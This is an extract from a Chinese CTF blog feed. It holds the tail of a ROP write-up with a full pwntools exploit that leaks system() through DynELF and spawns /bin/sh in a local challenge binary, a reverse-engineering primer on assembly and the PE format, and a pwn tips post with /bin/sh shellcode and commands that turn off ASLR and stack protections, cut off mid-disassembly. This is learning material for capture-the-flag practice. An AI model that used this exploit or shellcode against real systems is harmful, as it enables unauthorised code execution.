hex(system_addr)</div></pre></td></tr></table></figure></p><p>结果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">[+] Resolving <span class="string">'system'</span> <span class="keyword">in</span> <span class="string">'libc.so'</span>: 0xf7ffd920</div><div class="line">0x8049f14 =&gt; 01000000</div><div class="line">0x8049f1c =&gt; 0c000000</div><div class="line">0x8049f24 =&gt; 0d000000</div><div class="line">0xf7df1000 =&gt; 7f454c46</div><div class="line">0xf7fd2860 =&gt; b03dfaf7</div><div class="line">0xf7df1004 =&gt; 01010103</div><div class="line">0xf7fa3db0 =&gt; 01000000</div><div class="line">0xf7fa3db8 =&gt; 0e000000</div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line"><span class="string">0xf7df2390 =&gt; b5050000</span></div><div class="line"><span class="string">0xf7df4040 =&gt; 8ae4ee1c</span></div><div class="line"><span class="string">0xf7dfaa88 =&gt; 70310000</span></div><div class="line"><span class="string">0xf7e017d8 =&gt; 73797374</span></div><div class="line"><span class="string">0xf7e017dc =&gt; 656d0074</span></div><div class="line"><span class="string">0xf7dfaa8c =&gt; 30ab0300</span></div><div class="line"><span class="string">system_addr=0xf7e2bb30</span></div></pre></td></tr></table></figure></p><p>这里我们已经得到system_addr了</p><h2 id="构造payload3-得到shell"><a href="#构造payload3-得到shell" class="headerlink" title="构造payload3,得到shell"></a>构造payload3,得到shell</h2><p>找gadgets利用<br><code>objdump -d ./pwn3|egrep &quot;pop|ret&quot;</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">80482e9:5b                   pop    %ebx</div><div class="line">80482ea:c3                   ret    </div><div class="line">8048342:5e                   pop    %esi</div><div class="line">8048373:c3                   ret    </div><div class="line">80483a9:f3 c3                repz ret </div><div class="line">80483e3:f3 c3                repz ret </div><div class="line">804840c:f3 c3                repz ret </div><div class="line">804846f:c3                   ret    </div><div class="line">80484ad:59                   pop    %ecx</div><div class="line">80484ae:5b                   pop    %ebx</div><div class="line">80484af:5d                   pop    %ebp</div><div class="line">80484b3:c3                   ret    </div><div class="line">80484b7:c3                   ret    </div><div class="line">8048518:5b                   pop    %ebx</div><div class="line">8048519:5e                   pop    %esi</div><div class="line">804851a:5f                   pop    %edi</div><div class="line">804851b:5d                   pop    %ebp</div><div class="line">804851c:c3                   ret    </div><div class="line">8048520:f3 c3                repz ret </div><div class="line">8048536:5b                   pop    %ebx</div><div class="line">8048537:c3                   ret</div></pre></td></tr></table></figure></p><p>因为我们需要pop pop pop ret,这里我选择pppr=0x80484ad<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">payload2 =<span class="string">'a'</span>*140+p32(plt_read)+p32(pppr)+p32(0)+p32(bss_addr)+p32(8) </div><div class="line">payload2 += p32(system_addr)+p32(1)+p32(bss_addr)</div></pre></td></tr></table></figure></p><h2 id="5、整个攻击过程如下：首先通过DynELF获取到system-的地址后，我们又通过read将“-bin-sh”写入到-bss段上，最后再调用system（-bss），执行“-bin-sh”。最终的exp如下"><a href="#5、整个攻击过程如下：首先通过DynELF获取到system-的地址后，我们又通过read将“-bin-sh”写入到-bss段上，最后再调用system（-bss），执行“-bin-sh”。最终的exp如下" class="headerlink" title="5、整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:"></a>5、整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./pwn3'</span>)</div><div class="line">read_plt =  elf.plt[<span class="string">'read'</span>]</div><div class="line">write_plt=elf.plt[<span class="string">'write'</span>]</div><div class="line">main=elf.symbols[<span class="string">'main'</span>]</div><div class="line">pppr=0x8048519</div><div class="line">bss_addr= elf.bss()</div><div class="line"><span class="built_in">print</span> hex(bss_addr)</div><div class="line"></div><div class="line">def leak(address):</div><div class="line">    payload1=<span class="string">'a'</span>*140+p32(write_plt)+p32(main)+p32(1)+p32(address)+p32(4)</div><div class="line">    p.send(payload1)</div><div class="line">    data = p.recv(4)</div><div class="line">    <span class="comment">#print "%#x =&gt; %s" % (address, (data or '').encode('hex'))</span></div><div class="line">    <span class="built_in">return</span> data</div><div class="line"></div><div class="line">p = process(<span class="string">'./pwn3'</span>)</div><div class="line">d = DynELF(leak, elf=ELF(<span class="string">'./pwn3'</span>))</div><div class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</div><div class="line"><span class="built_in">print</span> <span class="string">"system_addr="</span> + hex(system_addr)</div><div class="line"><span class="comment">#gdb.attach(p)</span></div><div class="line"></div><div class="line">payload2 =<span class="string">'a'</span>*140+p32(read_plt)+p32(pppr)+p32(0)+p32(bss_addr)+p32(8) </div><div class="line">payload2 += p32(system_addr)+p32(main)+p32(bss_addr)</div><div class="line">p.send(payload2)</div><div class="line">p.send(<span class="string">"/bin/sh\0"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure><p>记录一下自己走过的坑，不知道找gadgets利用的时候pppr=0x80484ad,程序就会莫名的中断 ，<br>调试发现，当跳到0x80484ad这个地址时，程序就退出了。换个pppr=0x8048519，运行成功。<br>可能是 那个gadgets有问题，不知道了，不过可以多换几个试试</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;啥是rop?&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>RE_开始到开始</title>
    <link href="http://yoursite.com/2018/05/09/re_ctf_start/"/>
    <id>http://yoursite.com/2018/05/09/re_ctf_start/</id>
    <published>2018-05-09T03:52:41.268Z</published>
    <updated>2018-05-02T02:40:59.050Z</updated>
    
    <content type="html"><![CDATA[<p>RE的一些基础,逆向题目，需要大胆猜测。接下来就是小心验证。<br><a id="more"></a></p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>RE是逆向工程的简称（自己认为而已），逆向工程（又称逆向技术），是一种产品设计技术再现过程，即对一项目标产品进行逆向分析及研究，从而演绎并得出该产品的处理流程、组织结构、功能特性及技术规格等设计要素，以制作出功能相近，但又不完全一样的产品。逆向工程源于商业及军事领域中的硬件分析。其主要目的是在不能轻易获得必要的生产信息的情况下，直接从成品分析，推导出产品的设计原理。</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>1、IDA<br>2、Ollydbg<br>3、PEID</p><h1 id="逆向工程入门学习（转载）"><a href="#逆向工程入门学习（转载）" class="headerlink" title="逆向工程入门学习（转载）"></a>逆向工程入门学习（转载）</h1><p>汇编是逆向工程的基础，这篇文章讲解并不深入但是覆盖了你刚开始学习汇编需要了解的所有基础知识！汇编语言是一切程序的起点和终点，毕竟所有的高级语言都是建立在汇编基础之上的。在许多高级语言中我们都需要相对明确的语法，但是在汇编中，我们会使用一些单词缩写和数字来表达程序。</p><h2 id="I"><a href="#I" class="headerlink" title="I."></a>I.</h2><p> 单元、位和字节<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"> ·BIT（位） - 电脑数据量的最小单元，可以是0或者1。</div><div class="line">例：00000001 = 1；00000010 = 2；00000011 = 3     </div><div class="line">·BYTE（字节） - 一个字节包含8个位，所以一个字节最大值是255(0-255)。为了方便阅读，我们通常使用16进制来表示。</div><div class="line">·WORD（字） - 一个字由两个字节组成，共有16位。一个字的最大值是0FFFFh (或者是 65535d) (h代表16进制，d代表10进制)。</div><div class="line">·DOUBLE WORD（双字DWORD） - 一个双字包含两个字，共有32位。最大值为0FFFFFFFF (或者是 4294967295d)。</div><div class="line">·KILOBYTE（千字） - 千字节并不是1000个字节，而是1024 (32*32) 个字节。</div><div class="line">·MEGABYTE - 兆字节同样也不是一兆个字节，而是1024*1024=1,048,576 个字节</div></pre></td></tr></table></figure></p><h2 id="II"><a href="#II" class="headerlink" title="II."></a>II.</h2><p> 寄存器</p><p>寄存器是计算机储存数据的“特别地方”。你可以把寄存器看作一个小盒子，我们可以在里面放很多东西：比如名字、数字、一段话……<br>如今Win+Intel CPU组成的计算机通常有9个32位寄存器 (w/o 标志寄存器)。它们是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">EAX： 累加器</div><div class="line">EBX： 基址寄存器</div><div class="line">ECX： 计数器</div><div class="line">EDX： 数据寄存器</div><div class="line">ESI： 源变址寄存器</div><div class="line">EDI： 目的变址寄存器</div><div class="line">EBP： 扩展基址指针寄存器</div><div class="line">ESP： 栈指针寄存器</div><div class="line">EIP： 指令指针寄存器</div></pre></td></tr></table></figure></p><p>通常来说寄存器大小都是32位 (四个字节) 。它们可以储存值为从0-FFFFFFFF (无符号)的数据。起初大部分寄存器的名字都暗示了它们的功能，比如ECX=计数，但是现在你可以使用任意寄存器进行计数 (只有在一些自定义的部分，计数才必须用到ECX)。当我用到EAX、EBX、ECX、EDX、ESI和EDI这些寄存器时我才会详细解释其功能，所以我们先讲EBP、ESP、EIP。<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">EBP： EBP在栈中运用最广，刚开始没有什么需要特别注意的 ;) </div><div class="line">ESP： ESP指向栈区域的栈顶位置。栈是一个存放即将会被用到的数据的地方，你可以去搜索一下push/pop 指令了解更多栈知识。 </div><div class="line">EIP： EIP指向下一个将会被执行的指令。</div></pre></td></tr></table></figure></p><h2 id="III-标志寄存器"><a href="#III-标志寄存器" class="headerlink" title="III. 标志寄存器"></a>III. 标志寄存器</h2><p>标志寄存器代表某种状态。在32位CPU中有32个不同的标志寄存器，不过不用担心，我们只关心其中的3个：ZF、OF、CF。在逆向工程中，你了解了标志寄存器就能知道程序在这一步是否会跳转，标志寄存器就是一个标志，只能是0或者1，它们决定了是否要执行某个指令。</p><p>Z-Flag(零标志)：</p><p>ZF是破解中用得最多的寄存器(通常情况下占了90%)，它可以设成0或者1。若上一个运算结果为0，则其值为1，否则其值为0。(你可能会问为什么‘CMP’可以操作ZF寄存器，这是因为该指令在做比较操作(等于、不等于)，那什么时候结果是0什么时候是1呢？待会再说) </p><p>The O-Flag(溢出标志)：</p><p>OF寄存器在逆向工程中大概占了4%，当上一步操作改变了某寄存器的最高有效位时，OF寄存器会被设置成1。例如：EAX的值为7FFFFFFFF，如果你此时再给EAX加1，OF寄存器就会被设置成1，因为此时EAX寄存器的最高有效位改变了(你可以使用电脑自带计算器将这个16进制转化成2进制看看)。还有当上一步操作产生溢出时(即算术运算超出了有符号数的表示范围)，OF寄存器也会被设置成1。<br>The C-Flag(进位标志)：<br>进位寄存器的使用大概占了1%，如果产生了溢出，就会被设置成1。例，假如某寄存器值为FFFFFFFF，再加上1就会产生溢出，你可以用电脑自带的计算器尝试。</p><h2 id="IV-段偏移"><a href="#IV-段偏移" class="headerlink" title="IV. 段偏移"></a>IV. 段偏移</h2><p>内存中的一个段储存了指令(CS)、数据(DS)、堆栈(SS)或者其他段(ES)。每个段都有一个偏移量，在32位应用程序下，这些偏移量由 00000000 到 FFFFFFFF。段和偏移量的标准形式如下：</p><p><code>段：偏移量 = 把它们放在一起就是内存中一个具体的地址。</code></p><h2 id="VI-指令-字母表排序"><a href="#VI-指令-字母表排序" class="headerlink" title="VI. 指令 (字母表排序)"></a>VI. 指令 (字母表排序)</h2><p>请注意，所有的值通常是以16进制形式储存的。</p><p>大部分指令有两个操作符 (例如：add EAX, EBX)，有些是一个操作符 (例如：not EAX)，还有一些是三个操作符 (例如：IMUL EAX、EDX、64)。如果你使用 “DWORD PTR [XXX]”就表示使用了内存中偏移量为[XXX]的的数据。注意：字节在内存中储存方式是倒过来的(Win+Intel的电脑上大部分采用”小端法”，<br> WORD PTR <a href="双字节">XXX</a>和 BYTE PTR <a href="单字节">XXX</a>也都遵循这一规定)。 </p><p>大部分有两个操作符的指令都是以下这些形式（以add指令举例）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">add eax,ebx                          ;; 寄存器, 寄存器</div><div class="line">add eax,123                          ;; 寄存器, 数值</div><div class="line">add eax,dword ptr [404000]           ;; 寄存器, Dword  指针 [数值]</div><div class="line">add eax,dword ptr [eax]              ;; 寄存器, Dword  指针 [寄存器值]</div><div class="line">add eax,dword ptr [eax+00404000]     ;; 寄存器, Dword  指针 [寄存器值+数值]</div><div class="line">add dword ptr [404000],eax           ;; Dword 指针[数值], 寄存器</div><div class="line">add dword ptr [404000],123           ;; Dword 指针[数值], 数值</div><div class="line">add dword ptr [eax],eax              ;; Dword 指针[寄存器值], 寄存器</div><div class="line">add dword ptr [eax],123              ;; Dword 指针[寄存器值], 数值</div><div class="line">add dword ptr [eax+404000],eax       ;; Dword 指针[寄存器值+数值], 寄存器</div><div class="line">add dword ptr [eax+404000],123       ;; Dword 指针[寄存器值+数值], 数值</div></pre></td></tr></table></figure></p><h2 id="深入的必经之路"><a href="#深入的必经之路" class="headerlink" title="深入的必经之路"></a>深入的必经之路</h2><p>PE（Portable Executable）文件简介<br>PE（Portable Executable）文件是Windows操作系统下使用的可执行文件格式。它是微软在UNIX平台的COFF（通用对象文件格式）基础上制作而成。最初设计用来提高程序在不同操作系统上的移植性，但实际上这种文件格式仅用在Windows系列操作系统下。<br>PE文件是指32位可执行文件，也称为PE32。64位的可执行文件称为PE+或PE32+,是PE(PE32)的一种扩展形式（请注意不是PE64)。<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkd7ylncezj30e50k4ta1.jpg" alt=""><br>PE文件结构一般如上图所示。<br>当一个PE文件被执行时，PE装载器首先检查DOS header里的PE header的偏移量。如果找到，则直接跳转到PE header的位置。</p><p>当PE装载器跳转到PE header后，第二步要做的就是检查PE header是否有效。如果该PE header有效，就跳转到PE header的尾部。</p><p>紧跟PE header尾部的是节表。PE装载器执行完第二步后开始读取节表中的节段信息，并采用文件映射（在执行一个PE文件的时候，Windows并不在一开始就将整个文件读入内存，而是采用与内存映射的机制，也就是说，Windows装载器在装载的时候仅仅建立好虚拟地址和PE文件之间的映射关系，只有真正执行到某个内存页中的指令或者访问某一页中的数据时，这个页面才会被从磁盘提交到物理内存，这种机制使文件装入的速度和文件大小没有太大的关系）的方法将这些节段映射到内存，同时附上节表里指定节段的读写属性。</p><p>PE文件映射入内存后，PE装载器将继续处理PE文件中类似 import table （输入表）的逻辑部分<br>这四个步骤便是PE文件的执行顺序，具体细节读者可以参考相关文档。</p><h1 id="学习途径"><a href="#学习途径" class="headerlink" title="学习途径"></a>学习途径</h1><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p><a href="https://github.com/scwuaptx/HITCON-Training" target="_blank" rel="external">https://github.com/scwuaptx/HITCON-Training</a><br><a href="https://www.jarvisoj.com/challenges" target="_blank" rel="external">https://www.jarvisoj.com/challenges</a><br><a href="https://betamao.me/challenges" target="_blank" rel="external">https://betamao.me/challenges</a><br><a href="http://ctf.nuptzj.cn/challenges#" target="_blank" rel="external">http://ctf.nuptzj.cn/challenges#</a></p><h2 id="各种论坛"><a href="#各种论坛" class="headerlink" title="各种论坛"></a>各种论坛</h2><p>看雪 www.pediy.com<br>吾爱破解 www.52pojie.cn</p><h2 id="推荐书籍"><a href="#推荐书籍" class="headerlink" title="推荐书籍:"></a>推荐书籍:</h2><p>逆向工程核心原理<br>加密与解密<br>IDA Pro权威指南（第2版）<br>C++反汇编与逆向分析技术揭秘</p><h2 id="只想说，需要耐心。多百度-多逛博客，多认识点大师傅"><a href="#只想说，需要耐心。多百度-多逛博客，多认识点大师傅" class="headerlink" title="只想说，需要耐心。多百度,多逛博客，多认识点大师傅"></a>只想说，需要耐心。多百度,多逛博客，多认识点大师傅</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RE的一些基础,逆向题目，需要大胆猜测。接下来就是小心验证。&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN从开始到开始--pwn题的一些小技巧</title>
    <link href="http://yoursite.com/2018/05/09/pwn_tools/"/>
    <id>http://yoursite.com/2018/05/09/pwn_tools/</id>
    <published>2018-05-09T03:52:41.268Z</published>
    <updated>2018-05-09T02:27:23.926Z</updated>
    
    <content type="html"><![CDATA[<p>pwn题必备的套路<br><a id="more"></a></p><h1 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h1><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>首先安装pwntools<br><code>git clone https://github.com/Gallopsled/pwntools</code><br><code>cd pwntools</code><br><code>python setup.py install</code><br>安装peda<br><code>git clone https://github.com/longld/peda.git ~/peda</code><br><code>echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</code><br>编译x86程序依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install build-essential module-assistant  </div><div class="line">sudo apt-get install gcc-multilib g++-multilib</div></pre></td></tr></table></figure></p><p>生成x86文件<br><code>gcc -m32 -no-pie -fno-stack-protector -z execstack -o stack1 stack1.c</code><br>-no-pie会关掉PIE,-fno-stack-protector和-z execstack这两个参数会分别关掉Stack Protector和NX</p><h2 id="找到返回地址"><a href="#找到返回地址" class="headerlink" title="找到返回地址"></a>找到返回地址</h2><p>x86-如下<br>gdb ./pwn<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fki2xlxs3fj30jl0i7q9n.jpg" alt=""><br>‘a’*112+addr_ret<br>或者<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pattern create <span class="number">200</span></div><div class="line">pattern search <span class="number">0x4141313d</span></div></pre></td></tr></table></figure></p><p>或者<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ipython</div><div class="line">cyclic(<span class="number">200</span>)</div><div class="line">cyclic_find('aapa')</div></pre></td></tr></table></figure></p><p>x64<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkhzy1yhrgj30eq06eq42.jpg" alt=""></p><h2 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h2><p>这个联网才可以<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fki08gsy4bj30fv08nabr.jpg" alt=""><br>结果如下<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fki09ch88bj30gn0c80tp.jpg" alt=""><br>例子(shellcode):<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">shellcode = </div><div class="line"><span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"</span></div></pre></td></tr></table></figure></p><h2 id="找内存中函数地址"><a href="#找内存中函数地址" class="headerlink" title="找内存中函数地址"></a>找内存中函数地址</h2><p>这需要程序跑完,在gdb里<br><code>p system</code><br><code>p callsystem</code><br>查看内存<br><code>x\16x 0x482054</code><br><code>stack 100</code><br><code>x\s 0x482054</code><br><code>x \gx rsp</code></p><h2 id="搭建pwn题目"><a href="#搭建pwn题目" class="headerlink" title="搭建pwn题目"></a>搭建pwn题目</h2><p>查看是否开启随机化(不是0则开启)<br><code>cat /proc/sys/kernel/randomize_va_space</code><br>关闭随机化<br><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code><br>搭建题目<br><code>socat tcp-l:4000,fork exec:./pwn</code><br>连接测试<br><code>nc 127.0.0.1 4000</code></p><h2 id="coredump"><a href="#coredump" class="headerlink" title="coredump"></a>coredump</h2><p>在/etc/profile中加入以下一行，这将允许生成coredump文件<br><code>ulimit -c unlimited</code><br>在rc.local中加入以下一行，这将使程序崩溃时生成的coredump文件位于/tmp目录下<br><code>echo /tmp/core.%e.%p &gt; /proc/sys/kernel/core_pattern</code><br>调试coredump文件<br><code>gdb ./test test.core</code><br>x64找到溢出地点<br><code>x \100x $esp-100</code></p><h2 id="libc查询-然而我并没有查到"><a href="#libc查询-然而我并没有查到" class="headerlink" title="libc查询(然而我并没有查到)"></a>libc查询(然而我并没有查到)</h2><p><a href="http://libcdb.com/" target="_blank" rel="external">http://libcdb.com/</a></p><h2 id="查找到gadget"><a href="#查找到gadget" class="headerlink" title="查找到gadget"></a>查找到gadget</h2><p><code>objdump -d  babypwn4 | egrep &quot;ret|pop&quot;</code><br><img src="https://i.imgur.com/DVWbSy1.png" alt=""></p><h2 id="read和write"><a href="#read和write" class="headerlink" title="read和write"></a>read和write</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">read(int 0, void *buf, size_t count);</div><div class="line"></div><div class="line">#使用</div><div class="line">read(    0,   *buf,     count);</div><div class="line">&apos;a&apos;*140+p32(read_plt)+p32(ret)+p32(0)+p32(address)+p32(4)</div><div class="line">----------------------------------------------------------</div><div class="line">write(int 1, const void *buf, size_t nbyte);</div><div class="line"></div><div class="line">#使用</div><div class="line">write(   1,    *buf,     nbyte);</div><div class="line">&apos;a&apos;*140+p32(write_plt)+p32(ret)+p32(1)+p32(address)+p32(4)</div></pre></td></tr></table></figure><h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">elf = ELF(&apos;./pwn&apos;)</div><div class="line">gets_plt = symbols[&apos;gets&apos;]</div><div class="line">buf = elf.bss()</div></pre></td></tr></table></figure><h2 id="gdb断点"><a href="#gdb断点" class="headerlink" title="gdb断点"></a>gdb断点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb.attach(p,&quot;break *0x8048884&quot;) #断在某一处，因为是断在内核中，需要按几次c，就可以断到0x8048884的地方啦</div><div class="line">gdb.attach(p) #不好说，一般断在输入函数结束的地方</div></pre></td></tr></table></figure><h2 id="学不完的套路"><a href="#学不完的套路" class="headerlink" title="学不完的套路"></a>学不完的套路</h2><p>程序段<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">./le1 &amp;</div><div class="line">pidof le1</div><div class="line">cat /proc/<span class="number">1705</span>(pid)/maps</div></pre></td></tr></table></figure></p><p><img src="" alt=""><br>gdb里面的返向跑<br><code>recored</code><br>程序流程<br><code>ltrace ./le1</code><br>看调用了那些函数<br><code>strace ./le1</code><br>制作 call syscall和shellcode<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ipython</div><div class="line">from pwn <span class="keyword">import</span> *</div><div class="line">print shellcraft.sh()</div><div class="line"></div><div class="line">print shellcraft.syscall(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>)</div><div class="line">asm('mov eax,11')</div></pre></td></tr></table></figure></p><p>这里的<code>\x00\x00\x00</code>坏字符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">asm(&apos;&apos;&apos;</div><div class="line">xor eax,eax</div><div class="line">mov al,11</div><div class="line">&apos;&apos;&apos;)</div></pre></td></tr></table></figure></p><p><code>lay asm</code></p><h1 id="linux下shellcode的编写"><a href="#linux下shellcode的编写" class="headerlink" title="linux下shellcode的编写"></a>linux下shellcode的编写</h1><p>1、在shellcode中不能出现/x00也就是NULL字符，当出现NULL字符的时候将会导致shellcode被截断，从而无法完成其应有的功能<br>2、有一个int $0x80来执行系统调用</p><h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[] )</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">char</span> * name[<span class="number">2</span>];</div><div class="line">    name[<span class="number">0</span>] = <span class="string">"/bin/ksh"</span>;</div><div class="line">    name[<span class="number">1</span>] = <span class="literal">NULL</span>;</div><div class="line">    execve( name[<span class="number">0</span>], name, <span class="literal">NULL</span> );</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -m32 -no-pie -fno-<span class="built_in">stack</span>-protector -z execstack -o shellcd shellcd.c</div></pre></td></tr></table></figure><h3 id="gdb加载"><a href="#gdb加载" class="headerlink" title="gdb加载"></a>gdb加载</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">$gdb shellc</div><div class="line">gdb-peda$ disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line">   <span class="number">0x08048406</span> &lt;+<span class="number">0</span>&gt;:lea    ecx,[esp+<span class="number">0x4</span>]</div><div class="line">   <span class="number">0x0804840a</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">and</span>    esp,<span class="number">0xfffffff0</span></div><div class="line">   <span class="number">0x0804840d</span> &lt;+<span class="number">7</span>&gt;:push   DWORD PTR [ecx<span class="number">-0x4</span>]</div><div class="line">   <span class="number">0x08048410</span> &lt;+<span class="number">10</span>&gt;:push   ebp</div><div class="line">   <span class="number">0x08048411</span> &lt;+<span class="number">11</span>&gt;:mov    ebp,esp</div><div class="line">   <span class="number">0x08048413</span> &lt;+<span class="number">13</span>&gt;:push   ebx</div><div class="line">   <span class="number">0x08048414</span> &lt;+<span class="number">14</span>&gt;:push   ecx</div><div class="line">   <span class="number">0x08048415</span> &lt;+<span class="number">15</span>&gt;:sub    esp,<span class="number">0x10</span></div><div class="line">   <span class="number">0x08048418</span> &lt;+<span class="number">18</span>&gt;:call   <span class="number">0x8048458</span> &lt;__x86.get_pc_thunk.ax&gt;</div><div class="line">   <span 